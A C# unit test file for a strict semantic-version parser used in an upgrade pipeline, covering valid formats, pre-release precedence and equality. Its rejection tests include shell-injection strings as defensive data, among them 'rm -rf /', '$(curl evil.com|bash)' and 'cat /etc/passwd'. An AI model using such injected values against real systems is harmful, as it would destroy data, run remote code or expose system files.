using Squid.Core.Services.Machines.Upgrade;

namespace Squid.UnitTests.Services.Machines.Upgrade;

/// <summary>
/// Coverage for the strict-semver value type that gates every version that
/// flows through the upgrade pipeline. Three jobs:
///
/// <list type="number">
///   <item>Reject malformed input at the service boundary so it cannot reach
///         the bash template (audit H-5: shell-injection defence).</item>
///   <item>Accept pre-release tags so canary builds (1.5.0-beta.1) auto-resolve
///         (audit H-3: System.Version drops them silently).</item>
///   <item>Reject 2- or 4-component "versions" that System.Version tolerates
///         and that produce broken download URLs (audit H-4).</item>
/// </list>
/// </summary>
public sealed class SemVerTests
{
    [Theory]
    // Canonical 3-component
    [InlineData("1.4.0")]
    [InlineData("0.0.1")]
    [InlineData("999.999.999")]
    // Pre-release (audit H-3 — these were silently dropped by System.Version)
    [InlineData("2.0.0-beta.1")]
    [InlineData("1.5.0-rc.10")]
    [InlineData("1.0.0-alpha")]
    [InlineData("1.0.0-alpha.beta.1.2.3")]
    // Build metadata (legal per spec, allowed but not used for compare)
    [InlineData("1.4.0+sha.deadbeef")]
    [InlineData("1.4.0-beta.1+sha.deadbeef")]
    public void TryParse_AcceptsValidSemver(string raw)
    {
        SemVer.TryParse(raw, out var parsed).ShouldBeTrue($"'{raw}' is valid semver");
        parsed.ShouldNotBeNull();
    }

    [Theory]
    // 2-component (audit H-4 — System.Version tolerates this; produces broken URLs)
    [InlineData("1.4")]
    [InlineData("999.0")]
    // 4-component (audit H-4 — System.Version-style legacy)
    [InlineData("1.4.0.0")]
    [InlineData("1.0.0.5")]
    // Empty / whitespace
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    // Garbage
    [InlineData("latest")]
    [InlineData("v1.4.0")]      // leading 'v' rejected — operators must pass clean semver
    [InlineData("1.4.0.beta")]
    [InlineData("1.4.0_alpha")]  // underscore not legal in semver
    // Bash-injection attempts (audit H-5 — these would all execute as root if untrimmed)
    [InlineData("1.4.0\";rm -rf /;#")]
    [InlineData("1.4.0`whoami`")]
    [InlineData("1.4.0$(curl evil.com|bash)")]
    [InlineData("1.4.0\nrm -rf /")]
    [InlineData("1.4.0; cat /etc/passwd")]
    public void TryParse_RejectsInvalidOrUnsafeInput(string raw)
    {
        SemVer.TryParse(raw, out var parsed).ShouldBeFalse($"'{raw}' must be rejected");
        parsed.ShouldBeNull();
    }

    [Fact]
    public void TryParse_StripsWhitespace_BeforeValidation()
    {
        SemVer.TryParse("  1.4.0  ", out var parsed).ShouldBeTrue();
        parsed.ToString().ShouldBe("1.4.0");
    }

    [Theory]
    [InlineData("1.4.0", false)]
    [InlineData("1.4.0-beta.1", true)]
    [InlineData("2.0.0-rc.1", true)]
    public void IsPreRelease_FlagsPreReleaseTagsCorrectly(string raw, bool expectedPreRelease)
    {
        SemVer.TryParse(raw, out var parsed).ShouldBeTrue();
        parsed.IsPreRelease.ShouldBe(expectedPreRelease);
    }

    [Theory]
    // Numeric component compare wins
    [InlineData("1.4.0", "1.4.1", -1)]
    [InlineData("1.4.0", "1.5.0", -1)]
    [InlineData("2.0.0", "1.99.99", 1)]
    // Equal
    [InlineData("1.4.0", "1.4.0", 0)]
    // Per semver spec: a pre-release version has LOWER precedence than the
    // associated normal version. 1.4.0-beta.1 < 1.4.0. (Audit H-17 — without
    // this the AlreadyUpToDate check would treat beta as fresh-enough.)
    [InlineData("1.4.0-beta.1", "1.4.0", -1)]
    [InlineData("1.4.0", "1.4.0-beta.1", 1)]
    // Two pre-releases — lexicographic on the pre-release segment
    [InlineData("1.4.0-alpha", "1.4.0-beta", -1)]
    [InlineData("1.4.0-rc.1", "1.4.0-rc.2", -1)]
    public void CompareTo_FollowsSemverPrecedence(string left, string right, int expectedSign)
    {
        SemVer.TryParse(left, out var l).ShouldBeTrue();
        SemVer.TryParse(right, out var r).ShouldBeTrue();
        Math.Sign(l.CompareTo(r)).ShouldBe(expectedSign, $"{left} vs {right}");
    }

    [Fact]
    public void CompareTo_PreReleaseDoesNotMakeOlderStableSeemUpToDate()
    {
        // The exact regression we want pinned (audit H-17): without proper
        // semver compare, current=2.0.0-beta.1 vs target=1.4.0 falls through
        // to string equality → "not equal" → dispatch a downgrade silently.
        // With proper compare, 2.0.0-beta.1 > 1.4.0 (because 2 > 1 by major).
        SemVer.TryParse("2.0.0-beta.1", out var current).ShouldBeTrue();
        SemVer.TryParse("1.4.0", out var target).ShouldBeTrue();
        current.CompareTo(target).ShouldBeGreaterThan(0);
    }

    [Fact]
    public void IsValid_IsConvenientShorthand()
    {
        SemVer.IsValid("1.4.0").ShouldBeTrue();
        SemVer.IsValid("not-a-version").ShouldBeFalse();
    }

    // ========================================================================
    // Spec §11 — pre-release identifier precedence. The naive
    // string.CompareOrdinal approach picks `beta.2` over `beta.11` because
    // '1' < '2' lexically — the registry would silently miss every release
    // past beta.10. These tests pin the spec-correct ordering so a regression
    // to lex-compare is caught at unit-test time.
    //
    // Reference: https://semver.org/#spec-item-11
    // ========================================================================

    [Fact]
    public void CompareTo_NumericPreReleaseIdentifier_NotLexicographic()
    {
        // THE BUG. Without numeric-aware compare, beta.11 < beta.2 because
        // '1' < '2'. Spec says numeric identifiers compare NUMERICALLY.
        SemVer.TryParse("1.0.0-beta.2", out var lower).ShouldBeTrue();
        SemVer.TryParse("1.0.0-beta.11", out var higher).ShouldBeTrue();

        higher.CompareTo(lower).ShouldBeGreaterThan(0,
            "beta.11 must sort HIGHER than beta.2 (spec §11.1: identifiers consisting of only digits are compared numerically)");
    }

    [Theory]
    // Full spec example chain — every adjacent pair must order correctly.
    // (https://semver.org/#spec-item-11 — "Example")
    [InlineData("1.0.0-alpha", "1.0.0-alpha.1")]              // rule 4: longer wins when prefix equal
    [InlineData("1.0.0-alpha.1", "1.0.0-alpha.beta")]         // rule 3: numeric LOWER than alphanumeric
    [InlineData("1.0.0-alpha.beta", "1.0.0-beta")]            // rule 2: lex 'alpha' < 'beta'
    [InlineData("1.0.0-beta", "1.0.0-beta.2")]                // rule 4
    [InlineData("1.0.0-beta.2", "1.0.0-beta.11")]             // rule 1: numeric 2 < 11
    [InlineData("1.0.0-beta.11", "1.0.0-rc.1")]               // rule 2: lex 'beta' < 'rc'
    [InlineData("1.0.0-rc.1", "1.0.0")]                       // pre-release < normal (already pinned, here for chain)
    public void CompareTo_SpecExampleChain_LeftStrictlyLessThanRight(string left, string right)
    {
        SemVer.TryParse(left, out var l).ShouldBeTrue();
        SemVer.TryParse(right, out var r).ShouldBeTrue();
        l.CompareTo(r).ShouldBeLessThan(0, $"{left} must sort below {right}");
        r.CompareTo(l).ShouldBeGreaterThan(0, $"{right} must sort above {left} (symmetry)");
    }

    [Theory]
    [InlineData("1.0.0-alpha.1.2", "1.0.0-alpha.1.10")]       // multi-segment numeric
    [InlineData("1.0.0-alpha.1.alpha", "1.0.0-alpha.1.beta")] // multi-segment alphanumeric
    [InlineData("1.0.0-alpha.alpha.1", "1.0.0-alpha.alpha.10")] // numeric in deep position
    [InlineData("1.0.0-rc.9", "1.0.0-rc.10")]                 // common case from real Tentacle release tags
    public void CompareTo_NumericIdentifierAtDeepPosition_StillNumeric(string left, string right)
    {
        SemVer.TryParse(left, out var l).ShouldBeTrue();
        SemVer.TryParse(right, out var r).ShouldBeTrue();
        l.CompareTo(r).ShouldBeLessThan(0);
    }

    [Fact]
    public void CompareTo_HugeNumericIdentifier_NoOverflow()
    {
        // Spec implies BigInteger comparison; our trick of "(length, lex)"
        // for non-leading-zero numerics gives correct ordering up to any
        // length without parsing, side-stepping long.MaxValue overflow.
        SemVer.TryParse("1.0.0-rc.99999999999999999999", out var huge).ShouldBeTrue();
        SemVer.TryParse("1.0.0-rc.99999999999999999998", out var smaller).ShouldBeTrue();

        huge.CompareTo(smaller).ShouldBeGreaterThan(0,
            "20-digit numeric identifier comparison must remain numeric, not overflow into lex compare");
    }

    [Fact]
    public void CompareTo_PreReleaseSegmentSizeWinsOnEqualPrefix()
    {
        // §11.4: "A larger set of pre-release fields has a higher precedence
        // than a smaller set, if all of the preceding identifiers are equal."
        SemVer.TryParse("1.0.0-alpha.1.2.3.4", out var longer).ShouldBeTrue();
        SemVer.TryParse("1.0.0-alpha.1.2.3", out var shorter).ShouldBeTrue();

        longer.CompareTo(shorter).ShouldBeGreaterThan(0);
    }

    [Theory]
    [InlineData("1.0.0-01")]              // §9: numeric identifiers MUST NOT include leading zeros
    [InlineData("1.0.0-alpha.001")]       // leading zero in deep position
    [InlineData("1.0.0-009.alpha")]
    public void TryParse_RejectsLeadingZeroInNumericPreReleaseIdentifier(string raw)
    {
        // Spec §9 — spec-strictness. Without this, `01 < 9` lexically would
        // pick the wrong "highest" tag, AND the same tag could legitimately
        // be referenced as `01` and `1` in different places.
        SemVer.TryParse(raw, out _).ShouldBeFalse($"'{raw}' has a numeric pre-release identifier with leading zero — invalid per §9");
    }

    [Fact]
    public void Equals_TwoSemVersWithSameComponents_AreEqual()
    {
        // Without IEquatable<SemVer>, putting two equal versions into a
        // HashSet treats them as distinct (reference equality). Defensive
        // pin: equal versions are equal — by VALUE.
        SemVer.TryParse("1.4.0-rc.1", out var a).ShouldBeTrue();
        SemVer.TryParse("1.4.0-rc.1", out var b).ShouldBeTrue();

        a.Equals(b).ShouldBeTrue();
        a.GetHashCode().ShouldBe(b.GetHashCode(), "equal SemVers must hash equal");
        (a == b).ShouldBeTrue();
        (a != b).ShouldBeFalse();
    }

    [Fact]
    public void Equals_BuildMetadataIgnored_PerSemverSpec10()
    {
        // §10: Build metadata MUST be ignored when determining version precedence.
        // 1.4.0+sha.abc and 1.4.0+sha.xyz are the SAME version.
        SemVer.TryParse("1.4.0+sha.abc", out var a).ShouldBeTrue();
        SemVer.TryParse("1.4.0+sha.xyz", out var b).ShouldBeTrue();

        a.Equals(b).ShouldBeTrue("build metadata ignored per §10");
        a.CompareTo(b).ShouldBe(0);
    }
}
